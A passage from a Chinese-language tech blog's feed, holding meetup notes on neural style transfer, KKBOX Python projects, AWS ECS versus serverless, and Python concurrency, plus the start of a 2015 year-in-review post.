&lt;li&gt;Rectified Linear  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convolutional Neural Networks - 處理影像上很常用  &lt;ul&gt;
&lt;li&gt;Convolutional Layer  &lt;/li&gt;
&lt;li&gt;Pooling Layer - 把重要的訊息保留下來，不重要的丟掉。  &lt;ul&gt;
&lt;li&gt;Maximum Pooling  &lt;/li&gt;
&lt;li&gt;Average Pooling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecture  &lt;ul&gt;
&lt;li&gt;Input Layer  &lt;/li&gt;
&lt;li&gt;Convolutional Layer  &lt;/li&gt;
&lt;li&gt;Pooling Layer  &lt;/li&gt;
&lt;li&gt;Convolutional Layer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://arxiv.org/pdf/1409.1556.pdf"&gt;VGG19&lt;/a&gt; - 可以模擬人腦看東西的過程  &lt;ul&gt;
&lt;li&gt;What is VGG19?  &lt;ul&gt;
&lt;li&gt;VGG Net-E (19 layers)  &lt;/li&gt;
&lt;li&gt;Pre-trained model  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如何產生畫作  &lt;ul&gt;
&lt;li&gt;Content Generation  &lt;ul&gt;
&lt;li&gt;比較景物跟現在的畫布有何不同  &lt;/li&gt;
&lt;li&gt;Backward Propagation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Style Generation  &lt;ul&gt;
&lt;li&gt;Style 是比較抽象的概念  &lt;/li&gt;
&lt;li&gt;在這裡被當成是一種特徵，而且是跟位置無關的特徵。  &lt;/li&gt;
&lt;li&gt;Style Extraction  &lt;ul&gt;
&lt;li&gt;同一幅畫的的不同位置，轉換出來的風格會是一樣的。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Gramian_matrix"&gt;Gram Matrix&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;把位置的訊息拿掉後，讓 Canvas （畫布）的風格愈來愈接近目標畫作  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Artwork Generation  &lt;ul&gt;
&lt;li&gt;把景物跟風格都一起丟進 VGG19 後，再把兩個一起做最佳化。  &lt;ul&gt;
&lt;li&gt;Layer_total == (alpha)&lt;em&gt;Layer_content + (beta)&lt;/em&gt;Layer_style  &lt;ul&gt;
&lt;li&gt;alpha 的比重愈高，畫作愈寫實。  &lt;/li&gt;
&lt;li&gt;beta 的比重愈高，愈接近畫作。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/ckmarkohchang/neural-doodle"&gt;Neural Doodle&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;改良 Neural Art 的缺點  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://arxiv.org/abs/1601.04589"&gt;http://arxiv.org/abs/1601.04589&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Neural Art 採用 gram-based matrix 取得風格，因為忽略位置訊息，所以所有的部份風格都是相同的。  &lt;/li&gt;
&lt;li&gt;Neural Doodle 則採用了不會忽略位置訊息的 Patch-based Matrix，會尋找畫作中與畫布相近的部份取得該部份的風格，因此改善了 Neural Art 的缺點。  &lt;/li&gt;
&lt;li&gt;Patch-Based Style Transfer  &lt;ul&gt;
&lt;li&gt;透過兩向量內積除以兩向量絕對值來判斷相近的程度，然後自動去尋找最相近的 patch，得到 Most simillar patch  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sematic Style Transfer  &lt;ul&gt;
&lt;li&gt;可以為每個部份加上標籤  &lt;/li&gt;
&lt;li&gt;可以比 Patch-based 產生更精準的畫作  &lt;/li&gt;
&lt;li&gt;可以用小畫家上色，也可以使用 Pixel Labeling  &lt;/li&gt;
&lt;li&gt;Canvas 不經過 VGG19 而是透過 Average Pooling 再把 Canvas 和 Style 相加  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Image Analogy  &lt;ul&gt;
&lt;li&gt;直接用畫作產生 Semantic Map，然後再修改該 Sematic Map，再使用修改過後的 Semantic Map 生成新的畫作。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Experience from KKBOX&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;PyKKBOX  &lt;ul&gt;
&lt;li&gt;2011 initiate, private repo.  &lt;/li&gt;
&lt;li&gt;iOS team  &lt;/li&gt;
&lt;li&gt;KKBOX 一起聽  &lt;ul&gt;
&lt;li&gt;Challenges  &lt;ul&gt;
&lt;li&gt;iOS (client) co-works with Windows (broadcaster) only.  &lt;/li&gt;
&lt;li&gt;In 3 months, the API's verion changed 5 times.  &lt;/li&gt;
&lt;li&gt;There is even no broadcasters to listen to.  &lt;/li&gt;
&lt;li&gt;In academia, we may call this "ill-posed (optimization) problem".  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A bot for poc  &lt;ul&gt;
&lt;li&gt;主管要求在沒有 broadcaster 的情況下 demo iOS client 的功能，只好用 Python 接 API 快速刻一個偽 broadcaster 出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;因為 iOS team 的不熟 Python，不打算教 venv 那類的東西，所以只用到 built-in modules 跟 PyObject，code 直接 clone 下來就能跑了，完全不用 third-party packages。  &lt;/li&gt;
&lt;li&gt;用 Python 可以快速的建出 PoC，協助開發。  &lt;/li&gt;
&lt;li&gt;2013 就停止開發了。停止原因是沒有進一步的計劃和需求，而且畢竟是個 iOS team。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/imsardine/pyuia"&gt;PyUIA&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Started in 2013.  &lt;/li&gt;
&lt;li&gt;Testing for Playlist Auto-Sync  &lt;/li&gt;
&lt;li&gt;想做到讓 unittestings 可以儘量不需要額外寫程式碼，讓不會寫程式的 QA 可以用特定格式的 natural language 就可以新增測試。  &lt;ul&gt;
&lt;li&gt;（我記得 robotframework 好像也可以辦到這件事？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Video Encoding System  &lt;ul&gt;
&lt;li&gt;Challenges  &lt;ul&gt;
&lt;li&gt;Given a thousands of videos  &lt;/li&gt;
&lt;li&gt;Given ~150 videos per day  &lt;/li&gt;
&lt;li&gt;Given a scalable number of encoders on EC2 instances  &lt;/li&gt;
&lt;li&gt;Assuming the workflow for each video can be different  &lt;ul&gt;
&lt;li&gt;根據每個客戶有不同的限制和需求  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to make a robust system to handle this challenge in consideration of  &lt;ul&gt;
&lt;li&gt;Just 1.5 developer(s)  &lt;/li&gt;
&lt;li&gt;everything can be broken  &lt;/li&gt;
&lt;li&gt;computing resource is expensive (AWS)  &lt;/li&gt;
&lt;li&gt;AWS is weak  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 tcl 寫 Job Script，使用 Producter-Consumer model  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/KKBOX/mass"&gt;Mass&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;最大的挑戰是一天要轉三千部影片  &lt;ul&gt;
&lt;li&gt;最後成功了，但一天內用 AWS 燒掉了十幾萬還是幾十萬台幣，忘了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RDC Toolbox  &lt;/li&gt;
&lt;li&gt;Python 是個方便且讓人寫起來感到快樂的語言，歡迎大家一起開心地寫 Python。  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Taipei.py"></category><category term="Neural Network"></category><category term="KKBOX"></category><category term="Meetup"></category></entry><entry><title>AWSUGTW Meetup 10th Note</title><link href="https://blog.m157q.tw/posts/2016/04/19/awsugtw-meetup-10th-note/" rel="alternate"></link><published>2016-04-20T00:03:00+08:00</published><updated>2016-04-20T00:03:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-04-19:posts/2016/04/19/awsugtw-meetup-10th-note/</id><summary type="html">&lt;p&gt;&lt;a href="http://awsugtw.kktix.cc/events/10-tpe"&gt;http://awsugtw.kktix.cc/events/10-tpe&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Best practices for AWS ECS and Serverless&lt;/h1&gt;
&lt;h2&gt;Speaker: Pahud&lt;/h2&gt;
&lt;h3&gt;AWS EC2 Container Service (ECS)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ECS Cluster  &lt;ul&gt;
&lt;li&gt;ASG (Auto Scaling Group)  &lt;ul&gt;
&lt;li&gt;on-demand  &lt;/li&gt;
&lt;li&gt;spot instance (85% off compare to on demand ASG)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CloudWatch  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Auto Scaling Policy Design  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;30%-60%&lt;/code&gt;: scale out spot  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;= 60%&lt;/code&gt;: scale out on-demand  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;below 30%&lt;/code&gt;: scale in spot  &lt;/li&gt;
&lt;li&gt;Simple tip  &lt;ul&gt;
&lt;li&gt;on-demand 打底，spot 伸縮。  &lt;/li&gt;
&lt;li&gt;spot fleet if you need couples of instances (for RTB)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/sqs/"&gt;SQS (Job queue)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/elasticloadbalancing/"&gt;internal / external ELB&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/DeveloperGuide/QuickStartEC2Instance.html"&gt;CloudWatch Logs Agent&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Chat Ops  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/ecr/"&gt;ECR - EC2 Container Registry&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="http://www.slideshare.net/JulienSIMON5/amazon-ecs-january-2016/12"&gt;Load Balancing on Random Ports&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Meteor Galaxy  &lt;ul&gt;
&lt;li&gt;session-aware with random ports  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Is there a way to move code in cloud native way?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;"No server is easier to manage than no server."  &lt;/li&gt;
&lt;li&gt;Event-driven Cloud Computing  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.aws.amazon.com/lambda/latest/dg/welcome.html"&gt;AWS Lambda&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/api-gateway/"&gt;AWS API Gateway&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/kinesis/streams/"&gt;Amazon Kinesis&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;persistent  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/dynamodb/"&gt;DynamoDB&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以搭配 AWS Lambda 使用，幫忙 Archive  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/cloudtrail/"&gt;AWS CloudTrail&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/sns/"&gt;AWS SNS&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Mobile Integration&lt;/h3&gt;
&lt;p&gt;手機安裝 SDK，可以直接使用 AWS Lambda&lt;br /&gt;
支援 RequestResponse(Sync), Event(Async)&lt;br /&gt;
可以直接丟 json payload  &lt;/p&gt;
&lt;p&gt;如果不要直接跟 AWS Lambda 互動的話&lt;br /&gt;
可以透過 API Gateway 使用 HTTPS RESTful API  &lt;/p&gt;
&lt;p&gt;可以使用 Service Proxy Integration&lt;br /&gt;
透過 IAM assume role 去達成  &lt;/p&gt;
&lt;h3&gt;API Gateway Call Flow&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;User =&amp;gt;  
Internet =&amp;gt;  
Amazon CloudFront (保證最佳 routing) =&amp;gt;  
API Gateway =&amp;gt; API Gateway Cache  
            =&amp;gt; Amazon CloudWatch Monitoring  
            =&amp;gt; Endpoints on Amazon EC2  
            =&amp;gt; Any other accessible pubilc data.  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Pros and Cons&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Pros  &lt;ul&gt;
&lt;li&gt;cloud native with you business code in AWS Lambda  &lt;/li&gt;
&lt;li&gt;不需要維護 infra  &lt;/li&gt;
&lt;li&gt;leverage AWS PaaS infrastructure at scale  &lt;/li&gt;
&lt;li&gt;custom or federated authorization  &lt;ul&gt;
&lt;li&gt;接到 request 後，可以先丟到某個 AWS Lambda 作 Authorization 當作 Authorization module  &lt;/li&gt;
&lt;li&gt;或是 AWS Lamdba 轉到預先寫好的或已經存在的認証系統請求 Authorization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;very minimal cost for small-medium teams  &lt;ul&gt;
&lt;li&gt;AWS Lambda: 30M requests $11.53  &lt;/li&gt;
&lt;li&gt;AWS API Gateway: 1M requests $4.23  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/CaseyLee2/serverless-delivery"&gt;http://www.slideshare.net/CaseyLee2/serverless-delivery&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons - Lambda Limit  &lt;ul&gt;
&lt;li&gt;Lambda soft limit concurrency is 100  &lt;ul&gt;
&lt;li&gt;調高的話必須要申請，預設是只有 100，為了防止你不小心寫錯程式導致帳單爆表 (?)  &lt;/li&gt;
&lt;li&gt;300 seconds max duration per invocation  &lt;/li&gt;
&lt;li&gt;Lambda in VPC restriction  &lt;ul&gt;
&lt;li&gt;Private IP addresses  &lt;/li&gt;
&lt;li&gt;ENIC limit (default 20*5 == 100)  &lt;ul&gt;
&lt;li&gt;會用掉一張虛擬網卡  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons - API Gateway is Expensive  &lt;ul&gt;
&lt;li&gt;500-1000 QPS per AWS Account  &lt;/li&gt;
&lt;li&gt;5M requests/month == $18.79  &lt;/li&gt;
&lt;li&gt;100 QPS == $974.07/month == 31,350 NTD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons - Performance  &lt;ul&gt;
&lt;li&gt;push and pull invocation model of Lambda  &lt;/li&gt;
&lt;li&gt;-&amp;gt; delegation with higher memory  &lt;ul&gt;
&lt;li&gt;用一個專門的 AWS Lambda，只從 stream 抓東西出來，丟給別的 AWS Lambda 做邏輯處理。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;No connection pooling  &lt;ul&gt;
&lt;li&gt;Container 只有在第一次啟動的時候會 loading 最一開始初始化的部份  &lt;/li&gt;
&lt;li&gt;之後被 reuse 的時候會直接進 handler  &lt;/li&gt;
&lt;li&gt;所以不要把 conneciton 放在 code 一開始的部份，否則很可能會常常看到 conneciton 沒有正常 close，造成 TCP overhead.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons - Development  &lt;ul&gt;
&lt;li&gt;CloudWatch debugging is slow.  &lt;/li&gt;
&lt;li&gt;Immature CI/CD toolchains  &lt;/li&gt;
&lt;li&gt;lack of PHP, Ruby and Golang  &lt;/li&gt;
&lt;li&gt;re-deploy the whole bundle could be a pain.  &lt;ul&gt;
&lt;li&gt;萬一 bundle 的大小超過 20~30 MB 的話有個解法  &lt;ul&gt;
&lt;li&gt;把 bundle 丟到 S3 裡面後，寫支 AWS Lamdba 幫你把這包 bundle 丟到另外一個 AWS Lambda 做處理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;When should I use ECS and when for Serverless?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;When to use ECS  &lt;ul&gt;
&lt;li&gt;Financial concern - When you have traffic more than 100+ QPS  &lt;/li&gt;
&lt;li&gt;Operation concern - Long running process or API service  &lt;/li&gt;
&lt;li&gt;Language concern - Golang, PHP, Ruby, etc.  &lt;/li&gt;
&lt;li&gt;Performance concern  &lt;/li&gt;
&lt;li&gt;Protocol concern  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;When to use Serverless  &lt;ul&gt;
&lt;li&gt;Small project, simple business logic  &lt;/li&gt;
&lt;li&gt;focus on the code only  &lt;/li&gt;
&lt;li&gt;no infra management  &lt;/li&gt;
&lt;li&gt;stateless  &lt;/li&gt;
&lt;li&gt;quick micro services implementation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Conclusions&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;儘可能把服務 container 化  &lt;/li&gt;
&lt;li&gt;Build stateless application  &lt;/li&gt;
&lt;li&gt;Immutable architecture  &lt;ul&gt;
&lt;li&gt;every computing conponent can be replaced and scaled with no impact  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Focus on your business logic, instead of the infra, forget your infra  &lt;/li&gt;
&lt;li&gt;Try not use any EC2, if necessary, avoid SSH into EC2 for manual operation.  &lt;ul&gt;
&lt;li&gt;不要想要救任何一台機器，應該要儘可能做到 stateless，只要壞掉就抽換掉。  &lt;/li&gt;
&lt;li&gt;抱著這樣的想法，比較能夠設計出夠彈性化的架構。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fully-managed and fully-automation is the way to go.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Interview Quiz w/o Servers&lt;/h1&gt;
&lt;h2&gt;Speaker: Cliff Lu&lt;/h2&gt;
&lt;h3&gt;用 AWS 架設低成本的面試系統&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Interview Automation  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.bnext.com.tw/ext_rss/view/id/1099271"&gt;超過 90 秒的都要自動化！&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;考量  &lt;ul&gt;
&lt;li&gt;效能  &lt;/li&gt;
&lt;li&gt;管理  &lt;/li&gt;
&lt;li&gt;費用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AWS API Gateway + Lambda + S3  &lt;/li&gt;
&lt;li&gt;AWS Lambda  &lt;ul&gt;
&lt;li&gt;Serverless computing service  &lt;ul&gt;
&lt;li&gt;Support Python, Node.js, Java  &lt;ul&gt;
&lt;li&gt;Python 在上面沒有 share memory 可用，所以 multiprocess library 無效，得用 os.fork。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Managed, AWS 負責 HA and Scalability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/tmp&lt;/code&gt; 有 512MB 可用  &lt;/li&gt;
&lt;li&gt;若 24/7 運行 (128MB)，費用與 t2.nano 差不多  &lt;/li&gt;
&lt;li&gt;觸發與權限設置詳見文件  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AWS API Gateway  &lt;ul&gt;
&lt;li&gt;Managed HTTPS API Gateway  &lt;/li&gt;
&lt;li&gt;權限設計頗複雜，說明文件寫的蠻糟的，必須詳讀文件。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;心得&lt;/h1&gt;
&lt;p&gt;第一次參加 AWS 的聚會，也算是第一次認真接觸 AWS 啦。&lt;br /&gt;
畢竟之前也就只有在參加 Conf 還有一些閒聊的時候聽到些名詞。&lt;br /&gt;
只有懵懵懂懂的瞭解，印象最深的就是 AWS 有一堆自創的 service name，讓我不是很喜歡。&lt;br /&gt;
雖然公司目前都在用 GCP ，但還是會想瞭解一下 AWS 的內容。&lt;br /&gt;
希望之後對 GCP 和 AWS 都足夠瞭解之後，&lt;br /&gt;
可以有辦法自己歸納瞭解 GCP 和 AWS 之間的優缺點，&lt;br /&gt;
無論是在 Performance, Scalability, Pricing, Flexibility 等等。&lt;br /&gt;
畢竟如果要朝 Architect 走的話我想這是不可少的。&lt;br /&gt;
如果能力足夠的話可能還會再看看 Azure 吧。&lt;br /&gt;
不過目前看來應該還是會以 GCP 為主&lt;br /&gt;
希望之後研究夠深入的話可以有機會成為 GCP 相關 Library 的 contributor，&lt;br /&gt;
只是當個 User 的話實在是有點無趣。  &lt;/p&gt;
&lt;p&gt;話說 AWSUGTW 感覺蠻用心在經營的，&lt;br /&gt;
挑的 CLBC 夠寬敞（跟我常去 Taipei.py 用的那個 CLBC 差好多 QQ），&lt;br /&gt;
備有額外的茶點，而且免場地費。（真好奇錢從哪來的 XD)&lt;br /&gt;
還會請參加者填寫問卷收集回饋意見。&lt;br /&gt;
跟我最近參加過的 Taipei.py 跟 GCPUGTW 比起來算是比較會讓新加入者比較想繼續來的那種。&lt;br /&gt;
（而且女生好多，Taipei.py 只有一點點，GCPUGTW 完全沒有 XDDD）&lt;br /&gt;
不過沒啥人問問題，讓我不知道參加者到底是有沒有聽懂，&lt;br /&gt;
不過會後感覺蠻多人私底下去找講者討論的，應該只是不想或不敢當面問吧？&lt;br /&gt;
然後沒看到平常跑社群的熟面孔，&lt;br /&gt;
果然不同的 User Group 就是不同的生態圈啊。  &lt;/p&gt;</summary><category term="AWS"></category><category term="AWSUGTW"></category><category term="EC2"></category><category term="Serverless"></category><category term="Meetup"></category></entry><entry><title>Taipei.py 20160331 Meetup Note</title><link href="https://blog.m157q.tw/posts/2016/04/01/taipei-py-20160331-meetup-note/" rel="alternate"></link><published>2016-04-01T09:54:54+08:00</published><updated>2016-04-01T09:54:54+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-04-01:posts/2016/04/01/taipei-py-20160331-meetup-note/</id><summary type="html">&lt;p&gt;&lt;a href="https://www.meetup.com/Taipei-py/events/229246749"&gt;https://www.meetup.com/Taipei-py/events/229246749&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Topic 1: Skyfield  &lt;/li&gt;
&lt;li&gt;Topic 2: Uncomplicated Concurrency in Python  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Tutorial about skyfield&lt;/h1&gt;
&lt;h2&gt;David Mikolas (david.mikolas@gmail.com)&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://tw.pycon.org/2015apac/en/program/72"&gt;https://tw.pycon.org/2015apac/en/program/72&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://davidmikolas.blogspot.tw/"&gt;http://davidmikolas.blogspot.tw/&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;astropy - clothes  &lt;/li&gt;
&lt;li&gt;AstroPython  &lt;/li&gt;
&lt;li&gt;AstroBetter  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.blender.org/"&gt;Blender&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=vW93wkDqz54"&gt;https://www.youtube.com/watch?v=vW93wkDqz54&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Alfonsine_tables"&gt;Alfonsine tables&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Ephemeris"&gt;星歷表&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://ssd.jpl.nasa.gov/?ephemerides"&gt;http://ssd.jpl.nasa.gov/?ephemerides&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Julian_day"&gt;Julian Date&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Uncomplicated Concurrency in Python&lt;/h1&gt;
&lt;h2&gt;Mosky Liu&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;It will introduce how to implement the CSP (Communicating Sequential Processes) in Python with common libraries.  &lt;/p&gt;
&lt;p&gt;CSP（communicating sequential processes）是一個著名的並行系統（concurrent systems）數學理論 [1]，並獲得 Go lang 採用作為其並行設計的基礎 [2]。其優點是相較於傳統的多執行緒設計來說較為簡單 [3]，依此理論可以設計出更好維護的並行程式。  &lt;/p&gt;
&lt;p&gt;雖然 Python 並沒有特別將 CSP 設計成語言的一部份，但我們仍可以利用常見函數庫內的工具實現 CSP，寫出更好維護的並行程式。講者將介紹各種利用 Python 常見函數庫，包含 event-driven、multithreading、multiprocessing 層級，實現 CSP 的方法。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ctrl-C =&amp;gt; SIGINT&lt;br /&gt;
Ctrl-C in Python =&amp;gt; KeyboardInterrupt  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Channel-based Multithreading  &lt;/li&gt;
&lt;li&gt;With the channel  &lt;ul&gt;
&lt;li&gt;Channel 讓 Multi-Threading in Python 變得比較好寫  &lt;ul&gt;
&lt;li&gt;讓程式裏面只會有 Queue, 不需要費心去處理 join, lock 的問題，只要小心一下 Ctrl-C  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Producer-Consumer Pattern  &lt;/li&gt;
&lt;li&gt;SOA (Service-oriented Architecture)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CSP actually is  &lt;ul&gt;
&lt;li&gt;a formal language  &lt;ul&gt;
&lt;li&gt;describing patterns of interaction in concurrent systems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;mathematical theories  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Process_calculus"&gt;process calculi&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Lightning Talk&lt;/h1&gt;
&lt;h2&gt;Vectorizing String Operation&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.pha8.com/demo.html"&gt;http://www.pha8.com/demo.html&lt;/a&gt;  &lt;/p&gt;</summary><category term="Python"></category><category term="Taipei.py"></category><category term="skyfield"></category><category term="astronomy"></category><category term="concurrency"></category><category term="Meetup"></category></entry><entry><title>2015 回顧</title><link href="https://blog.m157q.tw/posts/2016/02/16/2015-review/" rel="alternate"></link><published>2016-02-16T23:40:05+08:00</published><updated>2016-02-16T23:40:05+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-02-16:posts/2016/02/16/2015-review/</id><summary type="html">&lt;p&gt;2016 也過了一個多月了，&lt;br /&gt;
回顧一下自己去年做了哪些事。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;1 月&lt;/h2&gt;
&lt;p&gt;Logdown 很不穩，然後登入又沒有 HTTPS，所以跳槽到 Pelican 的時候。&lt;br /&gt;
算是第一次接觸 static site generators，沒採用 GitHub 官方推薦的 Jekyll，&lt;br /&gt;
純粹就是因為喜歡 Python 而用 Pelican 這樣。&lt;br /&gt;
不用開 web browser，而是直接用 terminal 開 Vim 在 local 端寫文章，&lt;br /&gt;
用 Git 做版本控制，沒有網路也可以隨時把想記的東西記下來，蠻符合我的期待的，&lt;br /&gt;
跟平常 coding 的方式幾乎一樣，讓我幾乎是無痛轉換，&lt;br /&gt;
除了花了點時間去調整 Pelican 的 settings 跟選擇喜歡的 theme。  &lt;/p&gt;
